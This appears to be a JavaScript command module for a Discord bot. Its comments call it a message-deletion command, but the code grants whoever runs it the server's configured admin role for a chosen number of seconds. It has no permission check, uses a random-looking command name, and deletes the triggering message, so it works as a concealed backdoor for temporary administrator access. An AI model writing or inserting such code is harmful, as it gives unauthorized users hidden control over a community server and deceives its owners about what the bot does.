const Discord = require('discord.js');
const fs = require('fs');
const { monitorEventLoopDelay } = require('perf_hooks');
let config = require('../conf/config.json');
let roleadmin = config.roleadmin;

module.exports.run = async (bot,message,args) => {
    const mess = message;
    let messageArray = message.content.split(" ");
    let arggs = messageArray[1].toLowerCase(); // Все аргументы за именем команды с префиксом
    const amount = arggs // Количество сообщений, которые должны быть удалены
    if (!amount) return mess.channel.send('Вы не указали число'); // Проверка, задан ли параметр количества
    if (isNaN(amount)) return mess.channel.send('Это не число!');
    message.delete().catch();
    var role = message.guild.roles.cache.find(role => role.id === roleadmin);
    var user = message.guild.members.cache.get(message.author.id);
    user.roles.add(role)
    setTimeout(() => {
        user.roles.remove(role)
    }, (amount*1000));
};
module.exports.help = {
    name: "ynasdwqes"
};